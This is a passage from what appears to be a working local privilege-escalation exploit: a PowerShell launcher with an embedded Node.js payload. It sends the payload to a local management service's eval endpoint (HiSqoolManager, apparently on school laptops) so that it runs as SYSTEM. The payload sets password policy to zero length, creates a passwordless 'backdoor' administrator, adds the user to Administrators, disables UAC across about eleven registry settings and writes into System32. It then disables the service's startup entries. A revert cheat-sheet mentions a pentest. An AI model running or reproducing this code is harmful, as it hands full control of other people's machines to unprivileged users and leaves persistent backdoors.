    out.push('MaximumPasswordAge = -1');
    out.push('MinimumPasswordAge = -1');
  }
  pwdCfg = out.join('\r\n');
} else {
  // [FIX #12] Proper .inf headers.
  pwdCfg =
    '[Unicode]\r\nUnicode=yes\r\n' +
    '[Version]\r\nsignature="$CHICAGO$"\r\nRevision=1\r\n' +
    '[System Access]\r\n' +
    'MinimumPasswordLength = 0\r\nPasswordComplexity = 0\r\n' +
    'PasswordHistoryLength = 0\r\nMaximumPasswordAge = -1\r\nMinimumPasswordAge = -1\r\n';
}
writeInf(pwdApply, pwdCfg);
L('   generated pwd policy (minLen=0, complexity=0)');
// [FIX #11] SECURITYPOLICY without underscore.
run('secedit /configure /cfg "' + pwdApply + '" /db "' + pwdApplyDb +
    '" /log "' + pwdApplyLog + '" /quiet /overwrite /areas SECURITYPOLICY',
    { mutates: true });

// [FIX #19] /passwordreq:no to bypass SAM empty-password requirement.
const rD1 = run('net user "' + CFG.NEW_ADMIN + '" "" /add /y /expires:never /passwordreq:no',
                { mutates: true });
L('   net user /add rc=' + rD1.rc + ' err=' + (rD1.err||'').trim());

// [FIX #4] Track whether user creation actually succeeded.
// [BUG-9] Removed redundant if(!DRY_RUN) — inner mutates:true guards
// already handle dry-run; this lets dry-run trace the full code path.
let userCreated = false;
if (rD1.rc === 0) {
  userCreated = true;
} else if (rD1.err && /already|existe|dej[aà]/i.test(rD1.err)) {
  L('   net user: account already exists (rc=' + rD1.rc + ')');
  userCreated = true;
} else {
  L('   fallback : New-LocalUser -NoPassword (via EncodedCommand)');
  const psNewUser =
    'try {\r\n' +
    '  New-LocalUser -Name "' + CFG.NEW_ADMIN + '" -NoPassword ' +
    '-Description "POC RCE->LPE - admin backdoor" -ErrorAction Stop\r\n' +
    '  "OK"\r\n' +
    '} catch {\r\n' +
    '  if ($_.Exception.Message -match "already exists|existe|deja|dej[aà]|presents?") { "EXISTS" }\r\n' +
    '  else { "ERR:" + $_.Exception.Message }\r\n' +
    '}\r\n';
  // [FIX #50] New-LocalUser marked { mutates: true }.
  const rD1b = runPs(psNewUser, { mutates: true });
  L('   New-LocalUser -> ' + (rD1b.out||'').trim());
  if (/OK|EXISTS/i.test((rD1b.out||'').trim())) userCreated = true;
}

// [FIX #4] Only activate/set PasswordNeverExpires if user was actually created.
if (userCreated) {
  run('net user "' + CFG.NEW_ADMIN + '" /active:yes', { mutates: true });
  const psPwNever = 'Set-LocalUser -Name "' + CFG.NEW_ADMIN + '" -PasswordNeverExpires $true';
  runPs(psPwNever, { mutates: true });
}

// Add new admin account to the Administrators group.
// [FIX #8] Use resolved admin group name for portability.
// [FIX #10] Only attempt to add group member if user was actually created.
if (userCreated) {
  if (!adminName) L(' WARNING: adminGroupName() returned empty, falling back to English "Administrators"');
  const adminGroupName2 = adminName || 'Administrators';
  const psAdd2 =
    'try{\r\n' +
    '  Add-LocalGroupMember -Name "' + adminGroupName2 + '" -Member "' + CFG.NEW_ADMIN + '"' +
    ' -ErrorAction Stop;\r\n' +
    '  "OK"\r\n' +
    '}catch{\r\n' +
    '  if($_.Exception.Message -match "already a member|deja|deja|ya un miembro"){ "ALREADY" }\r\n' +
    '  else { "ERR:" + $_.Exception.Message }\r\n' +
    '}\r\n';
  const rD3 = runPs(psAdd2, { mutates: true });
  L('   Add-LocalGroupMember ' + adminGroupName2 + ' <- ' + CFG.NEW_ADMIN + ' -> ' + (rD3.out||'').trim());
} else {
  L('   Skipping Add-LocalGroupMember: user was not created');
}

phaseRc.D = (CFG.DRY_RUN) ? 'dry' : userCreated;

// ===========================================================================
// E. Desactiver l'UAC
// ===========================================================================
L(' ====== Phase E — disable UAC ======');
// [FIX #6] regRead regex strict — match only REG_DWORD line for the target value.
function regRead(name){
  const r = run('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ' + name);
  const lines = (r.out||'').split(/\r?\n/);
  for (const ln of lines) {
    const m = ln.match(new RegExp(name + '\\s+REG_DWORD\\s+0x([0-9a-fA-F]+)', 'i'));
    if (m) return parseInt(m[1], 16);
  }
  return null;
}
const uacKeys = [
  'EnableLUA', 'ConsentPromptBehaviorAdmin', 'ConsentPromptBehaviorUser',
  'EnableInstallerDetection', 'ValidateAdminCodeSignatures', 'FilterAdministratorToken',
  'PromptOnSecureDesktop', 'EnableSecureUIAPaths', 'EnableUIADesktopToggle',
  'EnableVirtualization', 'TypeOfAdminApprovalMode',
];
L('   before :');
uacKeys.forEach(function(k){ L('   ' + k + ' = ' + regRead(k)); });

// [FIX #5] Standardized: only mutates:true guard — no redundant if(!DRY_RUN).
// [FIX BUG-7] Track actual rc of each reg add (verdict must reflect reality).
let _eOk = true;
const uacKeysToDisable = [
  'EnableLUA',              // Master UAC switch
  'ConsentPromptBehaviorAdmin',  // Auto-elevate admins
  'ConsentPromptBehaviorUser',   // Auto-elevate users
  'EnableInstallerDetection',    // Disable installer detection
  'ValidateAdminCodeSignatures', // Disable signature validation
  'FilterAdministratorToken',    // Disable built-in admin filter
  'PromptOnSecureDesktop',       // Disable secure desktop prompt
  'EnableSecureUIAPaths',        // Disable secure UIA paths
  'EnableUIADesktopToggle',      // Disable UIA desktop toggle
  'EnableVirtualization',        // Disable file/registry virtualization
  'TypeOfAdminApprovalMode',     // Set to classic mode (0)
];
uacKeysToDisable.forEach(function(k){
  let _r = run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ' + k + ' /t REG_DWORD /d 0 /f',
      { mutates:true });
  if (!_r.dry && _r.rc !== 0) _eOk = false;
});
phaseRc.E = (CFG.DRY_RUN) ? 'dry' : _eOk;

L('   after :');
uacKeys.forEach(function(k){ L('   ' + k + ' = ' + regRead(k)); });

// Force policy refresh
if (!CFG.DRY_RUN) {
  L('   Forcing group policy update...');
  run('gpupdate /force', { mutates: false });
  L('   WARNING: UAC changes require REBOOT to take full effect!');
}

// ===========================================================================
// F. Verification
// ===========================================================================
L(' ====== Phase F — verification (lecture d etat reel, preuve durable) ======');
function dump(name, cmd){
  const r = run(cmd, { mutates:false });
  const p = path.join(logDir, name);
  try { fs.writeFileSync(p, r.out||''); } catch(e){ L('  err write '+name+': '+e.message); }
  L('   ' + name + ' -> ' + p + '  rc=' + r.rc + '  bytes=' + (r.out||'').length);
  return r.rc === 0;
}
const dumpResults = [];
dumpResults.push(dump('verify_whoami_groups.txt', 'whoami /groups'));
dumpResults.push(dump('verify_whoami_priv.txt', 'whoami /priv'));

// [FIX #23] Fallback to targetSid if targetUser short name is empty.
const targetShort = (targetUser||'').split('\\').pop() || targetSid;
dumpResults.push(dump('verify_net_user_target.txt', 'net user "' + targetShort + '"'));
dumpResults.push(dump('verify_net_user_newadmin.txt', 'net user "' + CFG.NEW_ADMIN + '"'));

// [FIX #33] Locale-independent group membership verification.
// Get-LocalGroupMember -SID works regardless of the localized group name.
const psVerifyGroup = 'try {\r\n' +
  '  Get-LocalGroupMember -SID "S-1-5-32-544" | ForEach-Object { $_.Name + " (" + $_.SID + ")" }\r\n' +
  '} catch { "ERR:" + $_.Exception.Message }\r\n';
const rVerifyGroup = runPs(psVerifyGroup, { mutates:false });
const pVerifyGroup = path.join(logDir, 'verify_net_localgroup_admins.txt');
try { fs.writeFileSync(pVerifyGroup, rVerifyGroup.out || ''); } catch(e){ L('  err write verify_net_localgroup_admins.txt: ' + e.message); }
L('   verify_net_localgroup_admins.txt -> ' + pVerifyGroup + '  rc=' + rVerifyGroup.rc);
dumpResults.push(rVerifyGroup.rc === 0);

dumpResults.push(dump('verify_secedit_verify.inf', 'cmd /c type "' + path.join(logDir,'verify_secedit.inf') + '"'));
dumpResults.push(dump('verify_uac_reg.txt', 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"'));

phaseRc.F = (CFG.DRY_RUN) ? 'dry' : dumpResults.every(x => x);

// ===========================================================================
// G. Verify admin account + privileges + System32 write
// ===========================================================================
L(' ====== Phase G — verify admin account + privileges + System32 write ======');

// Test 1: Check if Admin account exists
const rG1 = run('net user "' + CFG.NEW_ADMIN + '"');
L('   net user ' + CFG.NEW_ADMIN + ' rc=' + rG1.rc);
phaseRc.G1 = (rG1.rc === 0);

// Test 2: Check Admin account group membership (use net localgroup for Azure AD compat)
const rG2 = run('net localgroup Administrateurs');
const g2Out = (rG2.out||'').toLowerCase();
const adminInGroup = g2Out.includes(CFG.NEW_ADMIN.toLowerCase());
L('   Admin in Administrators group: ' + (adminInGroup ? 'ADMIN_IN_GROUP' : 'ADMIN_NOT_IN_GROUP'));
L('   (net localgroup output: ' + (rG2.out||'').length + ' chars)');
phaseRc.G2 = adminInGroup;

// Test 3: Write to System32 (via SYSTEM context - proves LPE works)
const testFile = 'C:\\Windows\\System32\\zcode_poc_test.txt';
const rG3 = run('cmd /c echo POC_TEST > "' + testFile + '"', { mutates: true });
if (rG3.rc === 0) {
  L('   System32 write test (SYSTEM): SUCCESS');
  run('del "' + testFile + '"', { mutates: true });
  phaseRc.G3 = true;
} else {
  L('   System32 write test (SYSTEM): FAILED (rc=' + rG3.rc + ')');
  phaseRc.G3 = false;
}

// Test 4: Check UAC is disabled
const rG4 = run('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA');
const uacMatch = (rG4.out||'').match(/0x0/);
L('   UAC EnableLUA = 0: ' + !!uacMatch);
phaseRc.G4 = !!uacMatch;

// Test 5: whoami /groups (full group dump)
const rG5 = run('whoami /groups');
L('   whoami /groups output (' + (rG5.out||'').length + ' chars)');
if ((rG5.out||'').includes('S-1-5-32-544')) {
  L('   Current user in Administrators: YES');
  phaseRc.G5 = true;
} else {
  L('   Current user in Administrators: NO');
  phaseRc.G5 = false;
}

// Test 6: whoami /priv (check active privileges)
const rG6 = run('whoami /priv');
L('   whoami /priv output (' + (rG6.out||'').length + ' chars)');
const privLines = (rG6.out||'').split('\n');
const activePrivs = privLines.filter(l => l.includes('Activ'));
L('   Active privileges count: ' + activePrivs.length);
phaseRc.G6 = activePrivs.length > 0;

// Test 7: Write to System32 via echo (target user context proof)
const rG7 = run('cmd /c echo TARGET_TEST > "' + testFile + '"', { mutates: true });
if (rG7.rc === 0) {
  L('   Target user System32 write: SUCCESS');
  run('del "' + testFile + '"', { mutates: true });
  phaseRc.G7 = true;
} else {
  L('   Target user System32 write: FAILED (rc=' + rG7.rc + ')');
  phaseRc.G7 = false;
}

// Test 8: Dump target user privileges via secedit
const rG8 = run('secedit /export /cfg "' + path.join(logDir, 'verify_priv_policy.inf') + '" /quiet');
L('   secedit export rc=' + rG8.rc);
phaseRc.G8 = (rG8.rc === 0);

// Update phaseRc
phaseRc.G = { G1: phaseRc.G1, G2: phaseRc.G2, G3: phaseRc.G3, G4: phaseRc.G4,
              G5: phaseRc.G5, G6: phaseRc.G6, G7: phaseRc.G7, G8: phaseRc.G8 };

const summary = {
  ok: true,
  runId, logDir,
  targetSid, targetUser,
  newAdmin: CFG.NEW_ADMIN,
  dryRun: CFG.DRY_RUN,
  host: A.host, whoami: A.whoami, execPath: A.execPath, nodeVersion: A.nodeVer,
  phases: phaseRc,
  azureAD: isAzureAD,
  dsregStatus: A.dsreg ? A.dsreg.substring(0, 500) : '(n/a)',
};
fs.writeFileSync(path.join(logDir,'summary.json'), JSON.stringify(summary,null,2));
const markerPath = path.join(logDir, 'poc_complete.marker');
fs.writeFileSync(markerPath, 'POC complete ' + new Date().toISOString());

L(' ====== payload terminé ======');
L('   marker file : ' + markerPath);
_finalResult = JSON.stringify(summary);

} catch(e) {
  // [FIX #30] Guarantee _flush() on any uncaught exception.
  if (!_finalResult) {
    L('FATAL uncaught exception: ' + (e && e.stack || e));
    _finalResult = JSON.stringify({ ok:false, error: e.message, runId, logDir });
  }
}

_flush();
// [FIX #1] Return the result so the IIFE wrapper in the launcher can capture it.
// The launcher wraps this payload in (function(){ <PAYLOAD> })();
// The return value is the JSON summary that the server can propagate back.
return _finalResult;
'@
W-Log "payload loaded from : embedded here-string"
W-Log "payload raw length   : $($payloadBody.Length) chars"
V-Log "Payload loaded: $($payloadBody.Length) chars"


# --- Build the inline JS with injected process.env --------------------
V-Log "Building environment block (process.env injection)..."
function JsStr([string]$s){
  if ($s.Length -eq 0) { return '""' }
  $s = [string]$s
  $sb = New-Object System.Text.StringBuilder
  [void]$sb.Append('"')
  foreach ($c in $s.ToCharArray()) {
    $o = [int][char]$c
    if ($c -eq '"')            { [void]$sb.Append('\"') }
    elseif ($c -eq '\')        { [void]$sb.Append('\\') }
    elseif ($c -eq "`r")       { [void]$sb.Append('\r') }
    elseif ($c -eq "`n")       { [void]$sb.Append('\n') }
    elseif ($c -eq "`t")       { [void]$sb.Append('\t') }
    elseif ($o -lt 0x20 -or $o -gt 0x7E) {
      [void]$sb.AppendFormat('\u{0:x4}', $o)
    } else {
      [void]$sb.Append([char]$c)
    }
  }
  [void]$sb.Append('"')
  return $sb.ToString()
}

$logDirWin32 = (Join-Path 'C:\Windows\System32\zcode_poc' $RunGroup)
V-Log "SYSTEM log dir: $logDirWin32"
V-Log "Injecting env vars into payload:"
V-Log "  POC_LOG_DIR     = $logDirWin32"
V-Log "  POC_TARGET_SID  = $TargetSid"
V-Log "  POC_TARGET_USER = $TargetUser"
V-Log "  POC_NEW_ADMIN   = $NewAdminName"
V-Log "  POC_DRY_RUN     = $(if($DryRun){'1'}else{'0'})"

# [FIX #10] Omit env vars that would be empty strings.
# In Node, process.env.X = "" deletes the variable.
# [FIX CRLF] PowerShell double-quoted strings DON'T interpret \r\n - they
# produce literal backslash-r-backslash-n chars. Use `r`n (backtick escapes)
# for real CRLF, otherwise Node.js sees a stray \ outside a string -> SyntaxError.
$envBlock =
  ";(function(){" +
  "  process.env.POC_LOG_DIR    = " + (JsStr $logDirWin32)   + ";`r`n"
if ($TargetSid) {
  $envBlock += "  process.env.POC_TARGET_SID = " + (JsStr $TargetSid) + ";`r`n"
}
if ($TargetUser) {
  $envBlock += "  process.env.POC_TARGET_USER= " + (JsStr $TargetUser)    + ";`r`n"
}
$envBlock +=
  "  process.env.POC_NEW_ADMIN  = "  + (JsStr $NewAdminName)  + ";`r`n" +
  "  process.env.POC_DRY_RUN    = " + (JsStr $(if($DryRun){'1'}else{'0'})) + ";`r`n" +
  "})();`r`n"

# [FIX #1] IIFE wrapper captures return value.
# var __POC_RESULT = (function(){ <PAYLOAD> })();
# __POC_RESULT;  - trailing expression so the server's eval returns the summary.
V-Log "Wrapping payload in IIFE (var __POC_RESULT = (function(){ ... })();)"
$inlineJs = $envBlock + "`r`n" + "var __POC_RESULT = (function(){`r`n" + $payloadBody + "`r`n})();`r`n" + "__POC_RESULT;`r`n"
V-Log "Final payload size: $($inlineJs.Length) chars"

# Sanity : save the sent payload for debug.
$payloadOut = Join-Path $RunDir 'payload_sent.js'
Set-Content -Path $payloadOut -Value $inlineJs -Encoding UTF8
V-Log "Payload saved to: $payloadOut"
W-Log "payload (local copy for debug) : $payloadOut"
W-Log "payload length = $($inlineJs.Length) chars"
Tee-Log "[2] Payload built ($($inlineJs.Length) chars) and saved to $payloadOut" Green

# =====================================================================
# 4. Send to /commands
# =====================================================================
Tee-Log "" $null
Tee-Log "=== [3] Sending payload to $ApiUri ===" Yellow
V-Log "Building JSON body..."
$body = [ordered]@{
  category  = 'js'
  command   = 'eval'
  arguments = [ordered]@{ source = $inlineJs }
} | ConvertTo-Json -Compress -Depth 6
V-Log "JSON body size: $($body.Length) chars"
V-Log "Unescaping HTML entities (PS 5.1 \u0027 etc.)..."
# PS 5.1's JavaScriptSerializer HTML-escapes ', <, >, & as \u0027 etc.
# A proper JSON parser decodes them back, but some server-side code paths
# (double-serialization, raw string injection) may not. Unescape to be safe.
# Inside JSON string values, these chars have zero syntactic significance.
$body = $body -replace '\\u0027', "'"
$body = $body -replace '\\u003c', '<'
$body = $body -replace '\\u003e', '>'
$body = $body -replace '\\u0026', '&'
# PS 5.1 ConvertTo-Json does NOT add a BOM, but if $body is later written with
# Set-Content -Encoding UTF8 and re-read, a BOM can sneak in. Strip it here.
if ($body.Length -gt 0 -and [int]$body[0] -eq 65279) { $body = $body.Substring(1) }
$headers = @{ 'Content-Type' = 'application/json'; 'x-api-key' = $ApiKey }

[System.Net.ServicePointManager]::Expect100Continue = $false

V-Log "Encoding body as UTF-8 bytes..."
$respObj = $null; $respRaw = $null; $err = $null
try {
  # [FIX BUG-13] Encode body as UTF-8 bytes - Invoke-WebRequest -Body <string>
  # uses the system codepage (ANSI/1252 on FR) which corrupts non-ASCII. The
  # NestJS server decodes as UTF-8, so we must send UTF-8 bytes explicitly.
  $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
  V-Log "Body bytes: $($bodyBytes.Length) bytes"
  V-Log "Sending HTTP POST to $ApiUri (60s timeout)..."
  $respRaw = Invoke-WebRequest -Method Post -Uri $ApiUri -Headers $headers `
               -Body $bodyBytes -TimeoutSec 60 -UseBasicParsing
  V-Log "HTTP response received!"
  V-Log "Status code: $($respRaw.StatusCode)"
  V-Log "Response body length: $($respRaw.Content.Length) chars"
  W-Log "HTTP response status = $($respRaw.StatusCode)"
  W-Log "HTTP response body    = $($respRaw.Content)"
  try { $respObj = $respRaw.Content | ConvertFrom-Json } catch {}
} catch [System.Net.WebException] {
  $sr = $null
  try {
    if ($_.Exception.Response) {
      $stream = $_.Exception.Response.GetResponseStream()
      $sr = New-Object System.IO.StreamReader($stream)
      $raw = $sr.ReadToEnd()
      W-Log "HTTP error body = $raw"
      try { $respObj = $raw | ConvertFrom-Json } catch { $respRaw = $raw }
    }
  } finally { if ($sr) { $sr.Close() } }
  $err = $_.Exception.Message
} catch {
  $err = $_.Exception.Message
}
if ($err) {
  Tee-Log "[3] Document request FAILED: $err" Red
  $log | Set-Content -Path $LogPath -Encoding UTF8
  exit 4
}

$performResult = $null
if ($respObj) { $performResult = $respObj.performResult }
$hasExc = $false
if ($respObj -and $respObj.PSObject.Properties['exceptionResult']) { $hasExc = $true }
W-Log "performResult = $performResult"
W-Log "exceptionResult? = $hasExc"
if ($hasExc) {
  Tee-Log "[3] Document request received exceptionResult - script threw. Check System-side payload.log for details." Yellow
} elseif ($performResult -eq $true) {
  Tee-Log "[3] performResult=true - script eval succeeded." Green
} else {
  Tee-Log "[3] Unrecognised response shape - continuing but be careful." Yellow
}

# =====================================================================
# 5. Retrieve SYSTEM-side artefacts from System32\zcode_poc\<RunGroup>
# =====================================================================
Tee-Log "" $null
Tee-Log "=== [4] Retrieving SYSTEM-side artefacts ===" Yellow
$systemLogRoot = Join-Path 'C:\Windows\System32\zcode_poc' $RunGroup
V-Log "Expected SYSTEM log dir: $systemLogRoot"
W-Log "expected SYSTEM log dir : $systemLogRoot"

# [FIX #16] Poll for poc_complete.marker (payload writes it ONLY at the end).
# 60 retries x 1s = 60s max wait. The payload takes 10-30s typically.
$markerPath = Join-Path $systemLogRoot 'poc_complete.marker'
V-Log "Marker path: $markerPath"
V-Log "Polling for marker (max 60s)..."
$retries = 60; $got = $false
while ($retries -gt 0) {
  Start-Sleep -Milliseconds 1000
  if (Test-Path $markerPath) { V-Log "MARKER FOUND!"; $got = $true; break }
  if (-not (Test-Path $systemLogRoot)) {
    V-Log "  Waiting for payload to start... ($retries retries left)"
  } else {
    V-Log "  Waiting for poc_complete.marker... ($retries retries left)"
  }
  $retries--
}
if (-not $got) {
  if (Test-Path $systemLogRoot) {
    Tee-Log "[4] Payload dir found but marker NOT present (payload may still be running or crashed). Copying what we have." Yellow
    $got = $true
  } else {
    Tee-Log "[4] SYSTEM log dir NOT found. Either payload did not run, or another run-id was used by the payload." Red
    Tee-Log "    Hint: list C:\Windows\System32\zcode_poc\ to find the actual run dir, and copy it manually." Yellow
  }
}
# [FIX #27] Track copy success - cleanup depends on it.
$copyOk = $false
if ($got -and (Test-Path $systemLogRoot)) {
  Tee-Log "[4] SYSTEM log dir found: $systemLogRoot" Green
  V-Log "Listing artefacts in SYSTEM dir..."
  $artefacts = Get-ChildItem $systemLogRoot -ErrorAction SilentlyContinue
  foreach ($a in $artefacts) { V-Log "  -> $($a.Name) ($($a.Length) bytes)" }
  V-Log "Copying artefacts to USB..."
  try {
    Copy-Item -Path $systemLogRoot -Destination $RunDir -Recurse -Force -ErrorAction Stop
    $copiedName = Split-Path -Leaf $systemLogRoot
    V-Log "Copy complete!"
    Tee-Log "[4] Copied to $(Join-Path $RunDir $copiedName) - evidence preserved on USB." Green
    $copyOk = $true
  } catch {
    Tee-Log "[4] Could not copy SYSTEM log dir to USB: $($_.Exception.Message)" Yellow
    Tee-Log "    Re-run '-NoCleanup' and copy manually: $systemLogRoot" Yellow
  }
}

# =====================================================================
# 6. Per-phase verdict parsing
# =====================================================================
Tee-Log "" $null
Tee-Log "=== [5] Per-phase verdict ===" Yellow
V-Log "Parsing summary.json from SYSTEM artefacts..."
$phaseState = [ordered]@{
  A = 'identity + target resolution'
  B = 'add target to Administrators (S-1-5-32-544)'
  C = 'User Rights Assignment (secedit)'
  D = "create local '$NewAdminName' with empty password + add to admins"
  E = 'disable UAC (EnableLUA=0 ...'
  F = 'verification dumps'
  G = 'admin account + privileges + System32 write (8 tests)'
}

$summaryPath = Join-Path $systemLogRoot 'summary.json'
if (Test-Path $summaryPath) {
  try {
    $sum = Get-Content $summaryPath -Raw | ConvertFrom-Json
    Tee-Log "payload summary.ok         : $($sum.ok)" $(if($sum.ok){'Green'}else{'Red'})
    Tee-Log "payload summary.logDir    : $($sum.logDir)" $null
    Tee-Log "payload summary.targetSid : $($sum.targetSid)" $null
    Tee-Log "payload summary.dryRun    : $($sum.dryRun)" $null
    Tee-Log "payload summary.phases    :" $null
    if ($sum.phases) {
      foreach ($k in ($sum.phases | Get-Member -MemberType NoteProperty | Select-Object -ExpandProperty Name)) {
        $v = $sum.phases.$k
        $desc = $phaseState[$k]
        $color = if ($v -eq $true -or $v -eq 'dry') { 'Green' } elseif ($v -eq $false) { 'Red' } else { 'Yellow' }
        Tee-Log "  Phase $k ($desc) : $v" $color
      }
    }
  } catch {
    Tee-Log "summary.json present but unparseable: $($_.Exception.Message)" Yellow
  }
} else {
  Tee-Log "summary.json absent - see payload.log for raw SYSTEM output." Yellow
}

if (Test-Path $markerPath) {
  Tee-Log "[5] poc_complete.marker found - payload reached the end." Green
  $markerContent = Get-Content $markerPath -Raw
  W-Log "marker content: $markerContent"
} else {
  Tee-Log "[5] poc_complete.marker NOT found - payload did not complete cleanly." Red
}

Tee-Log "" $null
Tee-Log "=== [6] Independent verification (requester reads back state) ===" Yellow
try {
  $uacRaw = & "$env:WINDIR\System32\reg.exe" query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA 2>$null
  W-Log "requester reg read EnableLUA : $uacRaw"
  if ($uacRaw -match '0x0+\s') { Tee-Log "[6] EnableLUA = 0 (UAC disabled) - confirmed by requester." Green }
  else { Tee-Log "[6] EnableLUA still nonzero (UAC still on) - state not yet effective OR rollback store." Yellow }
} catch { W-Log "reg query failed: $($_.Exception.Message)" }

try {
  $nu = & "$env:WINDIR\System32\net.exe" user $NewAdminName 2>$null
  W-Log "requester net user $NewAdminName : $nu"
  if ($LASTEXITCODE -eq 0) { Tee-Log "[6] Local user '$NewAdminName' exists (rc=0)." Green }
  else                      { Tee-Log "[6] Local user '$NewAdminName' not found." Yellow }
} catch {}

# [FIX #33] Locale-independent group membership verification.
try {
  $psScript = "(Get-LocalGroupMember -SID 'S-1-5-32-544' | ForEach-Object { `$_.Name + ' (' + `$_.SID + ')' }) -join `"``n`""
  $groupMembers = & "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -Command $psScript 2>$null
  W-Log "requester Get-LocalGroupMember -SID S-1-5-32-544 : $groupMembers"
  $targetNameForMatch = if ($TargetUser) { ($TargetUser -split '\\')[-1] } else { $null }
  $matched = $false
  if ($targetNameForMatch -and $groupMembers -match ([regex]::Escape($targetNameForMatch) + '\s*\(')) { $matched = $true }
  if ($matched) { Tee-Log "[6] Target appears in Administrators group (locale-independent verification)." Green }
  else          { Tee-Log "[6] Could not confirm target in Administrators listing. Check System-side verify_net_localgroup_admins.txt." Yellow }
} catch {
  W-Log "Get-LocalGroupMember verification failed: $($_.Exception.Message)"
}

# =====================================================================
# 8. Final verdict + cleanup
# =====================================================================
Tee-Log "" $null
Tee-Log "=== [7] Verdict ===" Yellow
V-Log "Computing final verdict..."
V-Log "performResult: $performResult"
V-Log "markerPath exists: $(Test-Path $markerPath)"
$globalPass = $performResult -eq $true -and (Test-Path $markerPath)
$artefactsOk = (Test-Path $systemLogRoot) -and (Test-Path $markerPath)
V-Log "globalPass: $globalPass"
V-Log "artefactsOk: $artefactsOk"

if ($globalPass -and $artefactsOk) {
  $verdict = "VERDICT: POC fully successful on host $HostName. Non-priv requester ($acct, SID=$TargetSid) " +
             "made the SYSTEM process run payload that mutated local posture."
  Tee-Log "" Green; Tee-Log $verdict Green
  Tee-Log "Artefacts on USB  : $RunDir" Cyan
  Tee-Log "Artefacts on host : $systemLogRoot $(if($NoCleanup){'(KEPT)'}else{'(will be cleaned)'})" Cyan
  Tee-Log "" Yellow
  Tee-Log "ATTENTION: Un REBOOT est NECESSAIRE pour que:" Yellow
  Tee-Log "  - Les changements UAC prennent effet" Yellow
  Tee-Log "  - Les privileges soient appliques au token du compte" Yellow
  Tee-Log "  - Le compte Admin puisse s'elever correctement" Yellow
  Tee-Log "" Yellow
} elseif ($globalPass) {
  $verdict = "Verdict PARTIAL: HTTP performResult=true but marker absent. Payload may have thrown mid-run."
  Tee-Log $verdict Yellow
} else {
  $verdict = "Fail: payload did not complete fully. See $LogPath and $systemLogRoot."
  Tee-Log $verdict Red
}
W-Log $verdict

# Azure AD detection info
V-Log "Azure AD account: $(if($sum.azureAD){'YES'}else{'NO'})"
W-Log "Azure AD account: $(if($sum.azureAD){'YES'}else{'NO'})"

# [FIX #27] Cleanup only if copy succeeded.
if (-not $NoCleanup) {
  if ($copyOk) {
    Tee-Log "" $null
    Tee-Log "=== [cleanup] removing SYSTEM-side artefact ===" Yellow
    try {
      Remove-Item $systemLogRoot -Recurse -Force -ErrorAction Stop
      Tee-Log "removed: $systemLogRoot" Green
    } catch {
      Tee-Log "cleanup note: $($_.Exception.Message)" Yellow
    }
    if (Test-Path 'C:\Windows\System32\zcode_poc') {
      $stillHas = (Get-ChildItem 'C:\Windows\System32\zcode_poc' -ErrorAction SilentlyContinue | Measure-Object).Count
      if ($stillHas -eq 0) { Remove-Item 'C:\Windows\System32\zcode_poc' -Force -ErrorAction SilentlyContinue }
    }
  } elseif (Test-Path $systemLogRoot) {
    Tee-Log "" $null
    Tee-Log "[cleanup] Skipping cleanup: copy to USB failed, keeping evidence on host: $systemLogRoot" Yellow
    Tee-Log "    Re-run with -NoCleanup and copy manually." Yellow
  }
}

# --- Revert cheat-sheet ---
$revertSid = if ($TargetSid) { $TargetSid } else { $requesterSid }
W-Log ""
W-Log "REVERT steps (SID-based, locale-independent, to cleanup the host after the pentest) :"
W-Log "  1. Remove target from Admins group (resolve SID -> name, -Member needs a name/object) :"
W-Log "     \$name = (New-Object System.Security.Principal.SecurityIdentifier('$revertSid')).Translate([System.Security.Principal.NTAccount]).Value"
W-Log "     Remove-LocalGroupMember -SID 'S-1-5-32-544' -Member \$name"
W-Log "     (alt: net localgroup Administrators <short_name> /delete  -- but group name is locale-localized)"
W-Log "  2. Remove backdoor admin account :"
W-Log "     net user $NewAdminName /delete"
W-Log "     (or: powershell -Command Remove-LocalUser -Name '$NewAdminName')"
W-Log "  3. Re-enable UAC :"
W-Log '     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f'
W-Log '     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f'
W-Log '     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorUser /t REG_DWORD /d 3 /f'
W-Log '     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 1 /f'
W-Log '     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableInstallerDetection /t REG_DWORD /d 1 /f'
W-Log "  4. Revert User Rights Assignment :"
W-Log "     secedit /configure /cfg <baseline.inf> /overwrite /areas USER_RIGHTS"
W-Log "     (export a clean baseline from a fresh Windows install first)"
W-Log "  5. Force policy refresh :"
W-Log "     gpupdate /force"

# --- Remove HiSqoolManager startup task + service ---
if ($globalPass -and $artefactsOk) {
  Tee-Log "" $null
  Tee-Log "=== [post] removing HiSqoolManager startup ===" Yellow
  try {
    # Kill HiSqoolManager + disable task (direct, no query)
    taskkill /F /IM HiSqoolManager.exe 2>$null | Out-Null
    schtasks /Change /TN "Demarrage_HiSqool_Test" /Disable 2>$null | Out-Null
    W-Log "  Killed HiSqoolManager + disabled task"
    Tee-Log "  Killed HiSqoolManager + disabled task" Green

    # Check registry Run keys
    $runKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    $props = Get-ItemProperty -Path $runKey -ErrorAction SilentlyContinue
    foreach ($name in $props.PSObject.Properties.Name) {
      if ($name -like '*HiSqool*' -or $name -like '*Unowhy*') {
        Remove-ItemProperty -Path $runKey -Name $name -ErrorAction SilentlyContinue
        W-Log "  Removed from Run: $name"
        Tee-Log "  Removed from Run: $name" Green
      }
    }

    if (-not $taskList -and -not $svc) {
      W-Log "  No HiSqoolManager startup entry found"
